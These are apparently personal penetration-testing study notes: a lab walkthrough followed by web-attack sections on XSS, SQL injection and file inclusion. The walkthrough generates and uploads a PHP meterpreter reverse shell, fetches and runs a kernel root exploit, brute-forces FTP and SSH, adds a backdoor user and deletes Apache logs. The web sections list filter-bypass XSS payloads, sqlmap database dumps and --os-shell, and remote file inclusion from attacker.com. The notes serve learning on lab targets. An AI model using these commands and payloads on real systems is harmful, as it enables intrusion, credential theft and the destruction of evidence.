o	wpscan --url https://192.168.1.36:12380/blogblog/ -U john -P /usr/share/wordlists/rockyou.txt --disable-tls-checks
o	after passwprd cracked go on the targeted website and loggin.

#How to Bypass 403 restrictions?
•	Adding in URL Paths: Adding this in paths of the URL and the file which is forbidden
o	/*		(EX: xyz.com/secret/*)
o	/%2f/	(EX: xyz.com/%2f/secret.txt/)
o	/./		(EX: xyz.com/secret/./)
o	//		(EX: xyz.com//secret)
o	/*/		(EX: xyz.com/secret/*/)
•	Adding Headers in request :By adding different headers in request with value 127.0.0.1 can also help in bypassing restrictions.
o	X-Custom-IP-Authorization
o	X-Forwarded-For
o	X-Forward-For
o	X-Remote-IP
o	X-Originating-IP
o	X-Remote-Addr
o	X-Client-IP
o	X-Real-IP
•	New 403 Bypass 
o	Download.php?file=../config.php ==> 403
o	Download.php?file=. /config.php⨀ ==> 200
o	Download.php?file=⊡ /config.php⨀  ==> 200
o	Download.php?file= .⊡ /config.php  ==> 200

•	msfvenom - a Metasploit standalone payload generator.
o	Also, a replacement for msfpayload and msfencode.
o	It is use for creating a payload.
o	Payload is a malware or a malicious code that the threat actor intends to deliver to the victim.
o	msfvenom -p php/mererpreter/reverse_tcp LHOST=192.168.1.2 LPORT=1337 -f raw
o	will get a raw payload code.
o	Remove /* from the beginning and create .php file.
o	And then upload these .php file in the target’s plugins.
o	Before executing this payload file. We need to create listener
o	Msfconsole
o	msf6 > use exploit/multi/handler
o	> set LHOST 192.168.1.2
o	> set LPORT 1337
o	> set payload php/meterpreter/reverse_tcp
o	> run
o	Now the Listner is started to u can execuite the .php file that u have uploaded in target server https://192.168.1.35:12380/blogblog/wp-content/uploads/
o	meterpreter > shell
o	python3 -c 'import pty;pty.spawn("/bin/bash")'
o	cd /home/www
o	cd
o	cd /var/www/https/blogblog
o	cat wp-config.php
o	here we got phpadmin user and passwd
o	/** MySQL database username & password */
o	define('DB_USER', 'root');
o	define('DB_PASSWORD', 'plbkac');
o	but we need to escalating privilege
o	cd /home/www
o	lsb_release -a
o	Description:    Ubuntu 16.04 LTS
o	Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
o	If .zip use unzip to extract, if .gz use gunzip to extract
o	wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
o	unzip 39772.zip
o	cd 39772
o	to extract .tar extension tar -xvf <file.tar>
o	cd ebpf_mapfd_doubleput_exploit
o	$ ./compile.sh
o	$ ./doubleput
o	Now if you check whoami it will show ‘root’
•	Hydra is a tool to guess/crack valid login/password pairs.
	hydra -h
	hydra -l elly -e nsr
•	Ex. Username: elly
•	n = null  Password: ___
•	s = same  Password: elly
•	r = reverse  Password: ylle
o	FTP  21/tcp
	hydra -l elly -e nsr ftp://192.168.1.35 
[DATA] attacking ftp://192.168.1.35:21/
[21][ftp] host: 192.168.1.35   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
	now look for the sensitive files like, get dbconfig-common, shadow, passwd.
	In the passwd file we get more users list for sorting it we use
	cat passwd | grep /home  will shows only user’s details
	cat passwd | grep /home | cut -d ':' -f 1  only will show usernames
	cat passwd | grep /home | cut -d ':' -f 1| tee users.txt  to save it into users text file
	hydra -L users.txt -e nsr ftp://192.168.1.35
	here we get all cracked passwords for users who used nsr
o	SSH  22/tcp
	Here we can try hydra on ssh ports 
	hydra -L users.txt -e nsr ssh://192.168.1.35
	ssh SHayslett@192.168.1.35
•	passwd: SHayslett
o	GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. -- gtfobins.github.io
	Ex. Search for sudo ftp permissions
•	sudo ftp
•	!/bin/sh
	Now again for escalating privilege repeat the steps
	Use exploit exploit-db.com/exploits/39772
	Dwnld > extract > and commands > XD root@red

o	Maintain Access in the target machine
	You can add user by creating
•	adduser bobby
•	pswd: hacked
o	Covering Tracks
	cd /var/log/apache2
	cat access.log | grep '192.168'
•	this are the logs you have to delete related to u rip
•	rm access.log
•	or you can just simply delete all the log files present and get out

•	MORE TIPS:
o	Crack Zip passwd
	fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>
o	Crack PDF passwd
	pdfcrack -f <file.pdf> -w /usr/share/wordlists/rockyou.txt
•	Proxy chaining (Become Anonymous)
o	Proxychains in Linux is another tool for anonymity providing anonymity and safe browsing with proxychains is easy. The proxychains works on socks4, socks5, HTTP, and https protocols.
o	locate proxychains
	/etc/proxychains.conf
o	Disable strict_chain (Add # infront)
o	Enable dynamic_chain (Remove #)
o	Enable proxy_dns (default)
o	Disable socks4 127.0.0.1 9050 (default)
o	Add new proxy servers (https://spys.one/en/)
	P.TYPE=======P.IP=======PORT
	socks4	125.26.99.228		44052
	http	3.236.52.219		8888
o	Use: add proxychains before using any cmd
	proxychains nmap -sT -p- <IP>

o	Setup With TOR:
	service tor status
	sudo apt-get install tor
	mousepad /etc/proxychains.conf
•	Remove Dynamic chain from comment
•	comment Strict chain and Random chain
•	Remove proxy DNS from comment
•	write socks5 127.0.0.1 9050 in last line of proxy list 
	service tor restart
	proxychains firefox www.bing.com


####################################
$$$$$$$$$$$$$$$~PENTESTING~$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$~END~$$$$$$$$$$$$$$$$

 
Section 7
Web Applications PENTEST
BurpSuit is used for performing security testing of web applications.
Browser ======= BurpSuit ======= Client 

Setup:
	Change Proxy setting to manual proxy configuration:
		HTTP Proxy: 127.0.0.1
		Port: 8080
		Check = Also use this proxy for HTTPS
	Note: Whenever you wanna use BurpSuit you have to change proxy setting and whenever you want to browse normally you have to change to “No proxy”
OR

1. Download “FoxyProxy” Extension for Mozella-FireFox
2. Check Proxy in BurpSuit > Proxy > Options > 127.0.0.1:8080
3. Go to the options tab > +Add of FoxyProxy 
	Fill:
	Title or Description: BurpSuit Pro
	Proxy Type: HTTP
	Proxy IP address or DNS name: 127.0.0.1
	Port: 8080
And Save. Note: Don’t forget to turn it on and off accordingly.
4. Download and Install Burp Certificate
o	Go to : https://burp/ > Click ‘CA Certificate’ = cacert.der
o	Open Settings > Certificates > View Certificates > Import > cacert.der > Check Both: Trust this CA for identify websites and email users.
o	If wanna delete, PortSwigger CA
	
BurpSuite Basics:
•	Scanning a website involves two phases
o	Crawling for content and functionality: Burp Scanner first navigates around the target site, closely mirroring the behavior of real users. It catalogs the structure and content of the site, and the paths used to navigate it, in order to build a comprehensive map of the site.
o	Auditing for vulnerabilities: The audit phase of a scan involves analyzing the website's behavior to identify security vulnerabilities and other issues. Burp Scanner employs a wide range of techniques to deliver a high-coverage, accurate audit of the target.

•	Proxy - What allows us to funnel traffic through Burp Suite for further analysis.
•	Target - How we set the scope of our project. We can also use this to effectively create a site map of the application we are testing.
•	Intruder - Incredibly powerful tool for everything from field fuzzing to credential stuffing and more.
•	Repeater - Allows us to 'repeat' requests that have previously been made with or without modification. Often used in a precursor step to fuzzing with the aforementioned Intruder.
•	Sequencer - Analyzes the 'randomness' present in parts of the web app which are intended to be unpredictable. This is commonly used for testing session cookies
•	Decoder - As the name suggests, Decoder is a tool that allows us to perform various transforms on pieces of data. These transforms vary from decoding/encoding to various bases or URL encoding.
•	Comparer - Comparer as you might have guessed is a tool, we can use to compare different responses or other pieces of data such as site maps or proxy histories (awesome for access control issue testing). This is very similar to the Linux tool diff.
•	Extender - Similar to adding mods to a game like Minecraft, Extender allows us to add components such as tool integrations, additional scan definitions, and more! 
•	Scanner - Automated web vulnerability scanner that can highlight areas of the application for further manual investigation or possible exploitation with canner another section of Burp. This feature, while not in the community edition of Burp Suite, is still a key facet of performing a web application test.



Vulnerable Labs:
•	Acunetix is an automated web application security testing tool that audits your web applications by checking for vulnerabilities like SQL Injection, Cross site scripting and other exploitable vulnerabilities.
•	Netsparker is a web application security scanner that provides increased visibility and deeper scans. It uses the unique DAST + IAST approach. It can seamlessly integrate with your existing web infrastructure.
•	Altoro Mutual is a vulnerable-by-design web application created by WatchFire (now AppScan Standard) as a demo test application for their BlackBox Scanner.

•	Google dorks for <vulnerability/ attack name> Helpful for bug bounty, like what types of parameters are vulnerable and where to inject payloads.

*ATTACK*

XSS (Cross Site Scripting)
1.	Reflected XSS (Server-Side)
2.	Stored XSS (Blind XSS) (Server-Side)
3.	DOM XSS (Clint-Side)
Get every available Payloads here
•	More: XSS Payloadbox | GitHub
•	Payloads All The Things | GitHub

1.	Reflected XSS
•	Steps to Hunt XSS
1.	Mapping/ Crawling Application
	First add the target into the scope and then click/use each and every function/link in the target.com 
	If inscope is like *.wku.edu then add In Scope
	.*\.wku\.edu$
	1) Go to target-> Scope-> Use advance scope control-> add
	2) Add Host regex:  .*\.facebook\.com$
	3) go to Site map-> Show only in-scope items
	4) All subdomains of http://facebook.com added :)
	.*\.test\.com$
	.*\.test\.*$
	(^|^[^:]+:\/\/|[^\.]+\.)zscaler.*
2.	Pick the parameters
	Now u will see ✔️ parameters in GET and POST (Target> Site map> Contents) Sort it.
	GET is used to request data from a specified resource.
	/test/demo_form.php?name1=value1&name2=value2
	POST is used to send data to a server to create/update a resource.
	POST /test/demo_form.php HTTP/1.1
	Host: target.com
	name1=value1&name2=value2
3.	Check Reflection
	Check every parameter by Send to Repeater.
	Change GET values in Repeater and see by searching values in Response if it reflects or not.
4.	Create payload
	Payload is kinda like html injection, we can put tags here or can insert java script.
	html: <u> is used to underline, <h1> is heading.
	put <u> in the Response values, copy url and check into the browser for values in underline.
	</title><img+src+3dx+onerror%3dconfirm(1)>
	<script>alert(1)</script> it’s a java script used to display alert popup.
	Copy url, check into the browser for popup.
5.	Uncommon Payloads:
	<img src=x onerror=confirm(1)>
	<svg onload=confirm(1)>

•	Impact of XSS
o	Cookie Stealing
	<script>alert(document.cookie)</script>
	User cookie: login=test%2Ftest
	After getting the cookie, you can use it by Cookie Editor.
	Decode: Name: login | Value: test/test
o	Phishing
	Creating a html form on the website that looks similar to original login page.
2.	Stored XSS (Blind XSS)
•	There is a page ‘Contact Us’ in any site, it would be like Email; fname, lname, message so this all messages goes to admin, so that page can be vulnerable 
•	Xsshunter.com is a tool that used to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS.
o	Copy payloads insert into the website and whenever payloads run by someone you will get all information in XSS Fires tab.
•	xss-payload-list
•	Training-XSS-muscles XSS Gym Exercises
•	Exercise 01 Injection in Title Tag
o	If payload not reflecting in browser, then try to close tags.
o	Find the first tag which is closing after ur payload. (Which contains ‘</tag>’)
o	Copy it and put before ur payload: “</tag><script>alert(1)</script>asdf”
o	</title><script>alert(1)</script><u>asdf
o	Exercise 02: </noscript><script>alert(1)</script>asdf
o	Exercise 03: </style><script>alert(1)</script>asdf
o	Exercise 05: </h1><script>alert(1)</script>asdf
•	Exercise 04 Filtered Injection Inside Event Handler
o	onload="doSomething('asdf')
o	Here there is a function dosomething
	if (arg !== '') console.log("arg as " + arg + ".")
o	Encode ‘ to HTML>URL= %26%23%78%32%37%3b
	Now check it inside in console in Inspector
	So there is a syntax error
o	So we need to create payload like
	asdf’-alert(1)-‘ encode ‘ in HTML>URL
	asdf%26%23x27%3b-alert(1)- %26%23x27%3b
o	%26%23x27%3b-alert(1)-%26%23x27%3b
•	Exercise 06 Injection in Attribute Value – Double Quote Delimiter
o	If the payload reflecting inside the html (<input type="hidden" name="p06" value="asdf">) so first, we need to exit from this input tag.
o	So we need to use “> before payload to get out from it.
o	asdf"><script>alert(1)</script>
o	Exercise 07: asdf'><script>alert(1)</script>
•	Exercise 08 Filtered Injection in Attribute Value – Double Quote Delimiter
o	When payload not able to get out from html by using this “>
o	Then use this input: asdf" onmouseover="alert(1)
o	<input type= "text" name="p08" value="asdf" onmouseover="alert(1)”>
o	And also, we are now closing with “ because it’s getting from server side.
o	and we need to encode space with +, because BurpSuite doesn’t supports space.
o	asdf"+onmouseover="alert(1)
o	another way is to use focus and auto focus, alert when click on the value.
o	asdf”+onfocus= "alert(1)
o	asdf"+autofocus+onfocus= "alert(1)
o	Exercise 09: we can close tags with + and //
	asdf’+onmouseover=’alert(1)
	asdf’+onfocus=’alert(1)+
	asdf’+autofocus+onfocus=‘alert(1)//
•	Exercise 10 Injection in Textarea Tag 
o	</textarea>asdf<script>alert(1)</script>
o	asdf</textarea><script>alert(1)</script>
•	Exercise 11 Injection in Script Tag – Single Quote Delimiter
o	</script>asdf<script>alert(1)</script>
o	Exercise 11: asdf</script><img+src=x+onerror=confirm(1)>
o	In case () getting error: asdf</script><img+src=x+onerror=confirm`1`>
o	Exercise 12: asdf</script><img+src=x+onerror=confirm(document.cookie)>
•	Exercise 13 Injection in Javascript Variable – Single Quote Delimiter
o	<script>
   var p13 = ‘asdf’;
</script>
o	In this case where value reflecting inside the java script and in “ and ‘ then 
o	use asdf’;alert(1);//so will get reflects  var p13 = ‘asdf’;alert(1);//’;
o	if ; not allow then, asdf’-alert(1)-‘ or asdf’-alert(1)//
o	Exercise 14: asdf"-alert(1)-"
•	Exercise 15 Filtered Injection in Javascript Variable – Single Quote Delimiter
o	asdf\'-alert(1)-//
o	used // to convert ‘; into comment
o	Exercise 16: asdf\";alert(1)//
o	Exercise 17: asdf</script><svg+onload=prompt(1)>
o	Exercise 18: asdf`-alert(1)-`
o	Exercise 19: asdf\`;alert(1)//
•	Exercise 20 Filtered Injection in Javascript Variable – Backticks Delimiter
o	In this case we are not able to get out from `asdf` even if we use `aasd\` it will give us result `asdf\\\``
o	So we use ${} bcz it can work inside ``
o	asdf${alert(1)}
•	Exercise 21 Validated Injection in HTTP Reference
o	It is a regex
o	we can’t replace the whole value
o	https://www.google.com/search?q=brutelogic
o	able to remove only some strings, after removing it looks like
	STRING:// STRING? STRING this is the main structure, and we have to make payload as this structure.
	javascript://alert(1)? STRING but here // making single line comment so we need to get help of Decoder
	In decoder we use %0a for new line and %25 for double encoded so it’d be like %250a
	Or we can just use %25%30%61 instead %0a
	javascript://%25%30%61alert(1)?STRING
•	Exercise 22 Injection in Iframe Tag
o	asdf"></iframe><img src=x onerror=confirm(1)>
o	asdf"></iframe><img+src%3dx+onerror%3dconfirm(1)> (CTRL + U to encode in URL)
•	Exercise 23 Injection in HTTP Header
o	CRLF => Carriage Return + Line Feed
	In Program
•	\r for Carriage Return
•	\n for Line Feed
	In URL Encoding
•	%0d for Carriage Return
•	%0a for Line Feed
o	So it’d be like %0d%0a
o	asdf%0d%0aXSS:%201 this is the CRLF injection attack used to set the cookies in victim’s browser. And we can add headers here.
o	So able to add header so able to change Content—Type
o	asdf%0d%0aContent—Type:+text/html
o	asdf<script>alert(1)</script>%0d%0aContent-Type:+text/html
•	Exercise 24 Filtered Double Injection in Javascript Variable  
o	Here ‘ getting encoded and its using sanitizes
o	-alert(1)//asdf\
•	Exercise 28 Injection in HTML Comments
o	<!-- asdf -->
o	To get out from HTML comment, put --> before payload.
o	-->asdf<script>alert(1)</script>
•	Exercise 29 Filtered Injection in HTML Comments
o	It is a regex
o	<!--+STRING+-->
o	<!--+asdf--><script>alert(1)</script>+-->
•	Exercise 31 Injection in Script Tag With Header
o	Here we can add header before “Accept:” header.
	ASDF: xss 
•	(<script>var headers ="asdf":"xss",</script>)
o	xss</script><script>alert(1)</script>
OR
o	We can manipulate path to get reflect.
	GET /gym.php?random
	GET /gym.php/asdf
o	<form action="/gym.php/asdf" method="POST">
o	To get out from tag, Payload:
	asdf"><script>alert(1)</script>
•	Exercise 32 Injection in URL
o	Directly put into the URL (manipulate path)
o	/asdf"><script>alert(1)</script>
•	Exercise 33 Injection Bypassing CSP
o	It is a case of Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks.
o	To find search Content-Security-Policy into source code
o	script-src 'nonce-9effed1b02010163'
o	CSP-Bypass Search this policy into the blog.
	In our case 
	Policy Example:
	script-src 'nonce-r4nd0mch4rs';
	Bypass Example:
	<Base Href=//X55.is>
o	asdf</h1><Base+Href=//X55.is>

3.	DOM XSS (Document Object Mode XSS)
•	Exercise 25 Injection in Javascript DOM – Document Sink
o	In this case it’s a DOM based XSS, When we change the value, it’s not reflecting in source code, but it is reflecting on Front end.
o	Using BurpSuit, Open Proxy> Open Browser> target.com
o	In the Burp Suite Chromium Extension Turn On DOM Invader Settings. Put any keyword that we are checking “asdf” and Update canary.
o	In the Inspect(F12), Click last tab DOM Invader, It will show us where the value getting reflected, here it’s in element.innerHTML, it’s on the HTML, not inside anything so we can directly put payload in the URL.
o	asdf<img src=x onerror=confirm(1)>
o	asdf<img src onerror=alert(1)>
•	Exercise 26 Injection in Javascript DOM – Location Sink
o	It is similar case of Ex 21 but DOM XSS
o	So whenever you get a URL redirection, whenever you provide any link in any of the parameter and it just to redirects you to that link, if your values reflected in the source code, then you can work them easily but it's not reflecting, but its redirecting then you can put this script.
o	javascript:alert(1)
•	Exercise 27 Injection in Javascript DOM – Execution Sink
o	In this case it is getting reflected but this time it's not inside the document where we can directly execute the code right, so it is inside the event.
o	eval is used to evaluate the things in the JavaScript.
	eval(function)=result
•	eval(1+2)=3
•	eval(‘Hi’+’there’)= Hi there
o	Go to Source tab and search, to find where is the eval
	eval('n.p=' + p27.toLowerCase());
o	alert(1) can put directly in URL to get exploit.
•	Exercise 30 Filtered Injection in Javascript DOM – Document Sink
o	It is similarly Ex.25 reflected inside element.innerHTML 
o	So we need to encode payload and put in the URL
o	asdf<img src=x onerror=confirm(1)>
o	asdf<img src onerror=alert(1)>
o	use BurpSuite Decoder or use CyberChef
	<img src=x onerror=confirm(1)> Encode into Octal
	74 151 155 147 40 163 162 143 75 170 40 157 156 145 162 162 157 162 75 143 157 156 146 151 162 155 50 61 51 76
	And replace all spaces with \ and put \ in beginning 
	\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\143\157\156\146\151\162\155\50\61\51\76
	And paste into URL
4.	More Tips of XSS
1.	<script>alert(l)</script>  alert(1)
•	If <script> tag is filtered and showing alert(1) output only then use this
•	<scr<script>ipt>alert(l)</scr</script>ipt>
o	So server’s code will filter <script> part and again our payload will execute.
o	<script>alert(l)</script>
2.	<script>alert(l)</script>
•	If they are using Regx + filtering ‘script’ then you can use
o	<SCRIPT>alert(l)</ SCRIPT>
o	<ScRIpT>alert(l)</sCrIPT>
3.	If the alert(1) is block, then use
•	alert()
•	confirm()
•	prompt()
•	print()
4.	If the () are blacklisted, then use
•	`` (backticks)
o	alert``
o	alert`1`
o	print``
o	prompt``
o	confirm``
5.	If only pooping up functions not working, then
o	Only works inside java script.
•	eval(‘ale’+’rt’)
•	eval(‘pro’+’mpt’)
•	eval(‘pr’+’int’)
•	eval(‘conf’+’irm’) 
6.	If eval(’any’+’thing’) also blacklisted, then
•	<script> eval(atob(“<Base64 encoded>”))</script>
•	Examples:
•	'ale'+'rt' ==Base64== J2FsZScrJ3J0Jw==
o	<script>eval(atob(“J2FsZScrJ3J0Jw==”))</script>
7.	If eval, atob and other pooping up functions blacklisted
•	Go to JSFuck, put payload (alert(2)), Encode, copy the encoded code, put in between <script> </script>
o	Example: <script><encode></script>
o	<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])</script>


 
*ATTACK*

SQL Injection | GitHub | Dorks List
•	A technique that attackers use to gain unauthorized access to a web application database by adding a string of malicious code to a database query.
•	Client Side (Front End) + Server Side (Backend) = Webapp
o	Client Side: HTML, CSS, Javascript
o	Server Side: PHR SQL, MYSQL
•	example.com/login
o	username: $username
o	password: $password
o	SELECT * FROM users WHERE username=$username AND password=$password
o	Database > Tables > columns > data
id	Username	Password
1.	Admin	admin
2.	John	Don123
o	AND I OR
	True AND True == True
	True AND False == False
	False AND True == False
	False AND False == False
	True OR True == True
	True OR False == True
	False OR True == True
	False OR False == False
o	Payloads:
	John” OR 1=1-- 
•	Here as OR condition one of value need to be true I.e 1=1 that mean it always 1 equal 1 means condition it true
•	Then dash, dash, space bcz its means comment like // in JS to it makes after – will comment	
•	SELECT * FROM users WHERE username=”John” OR 1=1-- ” AND password=”Don123”
	John”-- 
•	Use if you know the username
•	That means its gives username john and after that everything is comment and condition
•	SELECT * FROM users WHERE username=”John”-- ” AND password=”Don123”
o	VulnWeb.com
	Payloades: Put in Username and Password
•	xyz” or 1=1-- 
•	xyz’ or 1=1--
•	test’ or 1=1--
•	admin' 
•	admin' # 
•	admin'/* 
•	' or 1=1-- 
•	' or 1=1# 
•	' or 1=1/* 
•	') or '1'='1-- 
•	') or C11=11—

•	TIP: HOW TO HUNT?
o	Whenever u put ‘,` or any other then if it shows error like, “SQL Syntax error” or something like “on line” that mean it’s vulnerable.

•	Using BurpSuit (Identify SQL Injection)
o	Craw every functionality in webapp
o	For GET /artists.php?artist=1
	Check out Content-Length: 6251
	SELECT * FROM artists WHERE artist=’john’
o	For GET /artists.php?artist=abc
	Content-Length: 4853
o	So first need to identify what characters they are using for enclosing the values like ‘, “, `
	artis=(1), artis=(‘1’), artis=(“1”), artis=“1”
	artist=’1\’  Error
o	For GET /artists.php?artist=1\
	Length: 4927
	Render  Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists_php on line 62
	It means there could be a SQL injection.
o	We can also check errors by
	‘  Error
	‘-- Error (--space)
o	For artist=1’  Error
o	For artist=1’--+  Error (not using single quote)
o	For artist=1"--+  Error
o	For artist=1")--+  Error
o	For artist=1’)--+  Error
o	In this case they are not using any character to enclose the values
	For artist=1--+  No error (Normal result)
o	Also can try For artist[]=1
•	Find how many Parameters/Columns are there, Which Parameter is vuln.
o	Count Numbers of para.
	Common entry artist=1--+ (which is not giving the error)
	(suppose if no error for artist=1’--+ then put queries in artist1’+quer+--+)
	artist=1++--+
	Find Numbers for Columns
•	ORDER BY 1 (this is a query)
o	artist=1+ORDER+BY+1+--+
o	Increase number and check when error occurs.
o	artist=1+ORDER+BY+2+--+
o	artist=1+ORDER+BY+3+--+
o	Till 3 we are not getting errors (last value with no error)
o	Means the number of columns is 3
	Find Vulnerable columns 
•	UNION SELECT <found columns> (It required columns number)
•	artist=-1+UNION+SELECT+1,2,3+--+
o	Check which number is reflecting in render.
o	So that mean column 2 and 3 is vulnerable.
•	Check Functions
o	database() Return the default (current) database name
o	user() The user name and host name provided by the client
o	version() Return a string that indicates the MySQL server version
o	SOME MORE FUNCTIONS CAN CHECK
	BENCHMARK():Repeatedly execute an expression
	CHARSET():Return the character set of the argument
	COERCIBILITY():Return the collation coercibility value of the string argument
	COLLATION():Return the collation of the string argument
	CONNECTION_ID():Return the connection ID (thread ID) for the connection
	CURRENT_ROLE():Return the current active roles
	CURRENT_USER(), CURRENT_USER: The authenticated user name and host name
	FOUND_ROWS():For a SELECT with a LIMIT clause, the number of rows that would be returned were there no LIMIT clause
	ICU_VERSION():ICU library version
	LAST_INSERT_ID():Value of the AUTOINCREMENT column for the last INSERT
	ROLES_GRAPHML():Return a GraphML document representing memory role subgraphs
	ROW_COUNT():The number of rows updated
	SCHEMA():Synonym for DATABASE()
	SESSION_USER():Synonym for USER()
	SYSTEM_USER():Synonym for USER()
•	Put functions in the vulnerable column.
o	artist=-1+UNION+SELECT+1,database(),user()+--+
o	artist=-1+UNION+SELECT+1,user(),version()+--+

o	Blind SQL Injection
	When not able to detect or not giving an error after putting some values.
	How to detect
•	OR SLEEP(seconds) (query to delay page response)
•	artist=1+OR+SLEEP(5)--+
•	1+or+sleep(5)#
•	It will delay the page response by 5 sec
•	It will work in Time Blind, Boolean, error, blind, it will work in every case. 
	1 sec = 1000 Millisecond
•	In the right bottom corner.
	Intruder (Use in BurpSuit)
•	Send to Intruder > Clear S > select payload position >
•	Payloads > Paste (payload list) > Put space in Payload Encoding >
•	Start attack

•	Exploit SQL injection with Kali | SQLmap
o	Havij tool for windows
o	Copy Request Code of vulnerable page and put the * where we want to taste the SQL Injection.
	GET /artists.php?artist=1* HTTP/1.1
o	In Kali, create the sql.txt file for code
o	sqlmap -r sql.txt –banner
o	sqlmap -u test.php.com/artists.php?artist=1 -b
•	to test SQL Injection in given file.
	web server operating system: Linux Ubuntu
	web application technology: PHP 5.6.40, Nginx 1.19.0
	back-end DBMS operating system: Linux Ubuntu
	back-end DBMS: MySQL >= 5.0.12
	banner: '8.0.22-0ubuntu0.2Ø.04.2'
o	sqlmap -r sql.txt -dbs
•	to get databases
	available databases [2]:
	[*] acuart
	[*] information_schema
o	sqlmap -r sql.txt -D acuart –tables
•	used to dig into found databases.
	Database: acuart
	[8 tables]
	+-----------+
	| artists   |
	| carts     |
	| categ     |
	| featured  |
	| guestbook |
	| pictures  |
	| products  |
	| users     |
	+-----------+
o	sqlmap -r sql.txt -D acuart -T users --columns --dump
	Database: acuart
	Table: users
	[8 columns]
	+---------+--------------+
	| Column  | Type         |
	+---------+--------------+
	| address | mediumtext   |
	| cart    | varchar(100) |
	| cc      | varchar(100) |
	| email   | varchar(100) |
	| name    | varchar(100) |
	| pass    | varchar(100) |
	| phone   | varchar(100) |
	| uname   | varchar(100) |
	+---------+--------------+
o	sqlmap -r sql.txt -D acuart -T users -C uname, pass –dump
	Database: acuart
	Table: users
	[1 entry]
	+-------+------+
	| uname | pass |
	+-------+------+
	|  test | test |
	+-------+------+
o	It is critical vulnerability; anyone can steal database.
o	Remote Code Execution (RCE)
	Attackers remotely execute commands to place malware or other malicious code on your computer or network.
	sqlmap -r sql.txt --os-shell
•	Can get root privileges if it is vulnerable.

•	Exploit only using address bar | Manual Injection
o	For http://testphp.vulnweb.com/artists.php?artist=1
o	Check whether it is vulnerable or not.
	Error base technique by adding symbol at the end of input which will try to break the query. Symbols include:
•	Single quote (') - used to close a string and cause a syntax error.
•	Quote (") - used to close a string and cause a syntax error.
•	Parentheses () - used to group and order the statements, which can cause a syntax error if not closed properly.
•	Dash (-) - used to comment out the rest of a line, which can cause a syntax error if not closed properly.
•	Semicolon (;) - used to separate multiple SQL statements, which can cause a syntax error if not closed properly
•	Union operator (UNION) - used to combine the results of two or more SELECT statements, which can cause a syntax error if not used correctly.
•	Logical operators (AND, OR, NOT) - used to combine or negate conditions in a SQL statement, which can cause a syntax error if not used correctly.
•	Wildcard characters (%) and (_) - used to match any number of characters or a single character respectively, which can cause a syntax error if not used correctly.
	http://testphp.vulnweb.com/artists.php?artist=1’
	http://testphp.vulnweb.com/artists.php?artist=1”
	It it shows error like: that mean its vulnerable for SQLi.
•	Warning: mysql_fetch array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 64

o	Find the number of columns in the database.
	ORDER BY, increase the numbers until it shows error,
•	?artist=1 order by 1--
•	?artist=1 order by 2--
•	?artist=1 order by 3--

o	Find the table name in the columns.
	UNION SELECT
	?artist=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--
•	The statement is composed of several parts:
•	"?artist=1" - This is the original query that the web application is expected to execute. It is likely that the web application is using the "artist" parameter in a SELECT statement to retrieve data from a specific table.
•	"-1" - This value is used to replace the original query's value and trick the query to return the result of the new query. alternate (-1 | 1’ | -1’)
•	"union select" - This keyword is used to combine the results of the original query with the results of a new query.
•	"1,2" - These values are used to match the number of columns in the original query. Since the original query is likely to return a single column, these values are used to match the number of columns in the original query.
•	"group_concat(table_name)" - This function retrieves the names of all the tables in the targeted database. It replace 3rd column.
•	"from information_schema.tables" - This part of the query is used to specify the source of the data. The information_schema is a database that contains metadata about all the tables, columns, and other database objects.
•	"where table_schema=database()" - This part of the query is used to filter the results to only show tables from the current database.
•	"--" - This is used to comment out the rest of the query and prevent any additional statements from being executed.

o	Find Column name from table name (ex. users)
	?artist=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--
•	table_name  column_name
•	information_schema.tables  information_schema.columns
•	table_schema=database()  table_name="users"

o	Find data from the found columns (ex. uname)
	artist=-1 union select 1,2,group_concat(uname) from users--
	artist=-1 union select 1,2,group_concat(uname,pass) from users--


 
*ATTACK*

File Inclusion / Path/Directory Traversal
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a “dynamic file inclusion” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

URL:
example.com/file/?page=login.php

CODE:
<?php
$page = $_GET[‘page’];
include($page);

•	Some time, developer use another value ‘app’ and them append $variable, to in this case u have to put ../ the get out from default directory to get code execute.

example. com/file/?page=../etc/passwd

$page = $_GET[‘page’];
include('/app/'.$page); => include('/app/../etc/passwd');

Types:
1.	Local File Inclusion.
example.com/file/?page=/etc/passwd
If we give this path in url then we’ll get password file. This will be the vulnerability.

2.	Remote File Inclusion.
example.com/file/?page=https://attacker.com/malicious.php
If you provide a like, then u can execute the code from malicious.php file into the target’s website. And can get RCV this is very critical vulnerability. I.e u can execute any code remotely in targets website.

Using BURPSUITE
•	Crawl the website and check the parameters which containing similar the given bellow: like file, path or url.
o	example.com/file/?page=login.php
o	example.com/file/?page=login
o	example.com/file/?page=/app/login.php
o	example.com/file/?page= https://sub.example.com/login.php
o	It could be
o	example.com/file/?page=login.php
o	example.com/file/?file=login
o	example.com/file/?filename=/app/login.php
o	example.com/file/?path=https://sub.example.com/login.php
o	example.com/file/? document=login.php
o	example.com/file/? documenturi=/app/login.php
o	example.com/file/?url= https://sub.example.com/login.php
o	example.com/file/?uri= https://sub.example.com/login.php
•	MORE BinGoo/LFI-dork.lst at master · Hood3dRob1n/BinGoo.
•	Now
•	For
•	GET /showimage.php?file=./pictures/3.jpg HTTP/1.1
o	Content-Type: image/jpeg
	Now, edit the para and give it path /etc/passwd
o	GET /showimage.php?file=/etc/passwd HTTP/1.1
	Now here we get the errors, showing the path /hj/var/www/ 
	To travel back to the directory, use ../ to get a dir back. Or put ../../ to go 2x back in dir.
